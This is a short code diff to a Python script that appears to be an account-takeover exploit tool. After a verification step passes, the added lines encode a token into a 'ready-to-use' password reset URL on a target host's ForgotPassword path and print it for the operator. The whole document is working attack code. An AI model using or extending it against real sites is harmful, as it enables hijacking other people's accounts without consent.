@@ -27,6 +27,7 @@ import sys
 import threading
 import time
 import urllib.error
+import urllib.parse
 import urllib.request
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -486,6 +487,15 @@ Examples:
         log(f"[{'+'if r==1 else '-'}] Verification: {'PASS' if r==1 else 'FAIL'}")
         if r != 1:
             sys.exit(1)
+
+        # Build ready-to-use password reset URL
+        params_encoded = urllib.parse.quote(token_b64, safe='')
+        ret_url_inner = f"ForgotPassword?params={params_encoded}&country=IE&language=en_IE&source=reset"
+        ret_url_encoded = urllib.parse.quote(ret_url_inner, safe='')
+        reset_url = f"https://{args.host}/s/confirmation-link-is-expired?retURL={ret_url_encoded}"
+
+        log(f"\n[+] Password Reset URL:")
+        log(f"    {reset_url}")
 
 
 if __name__ == "__main__":
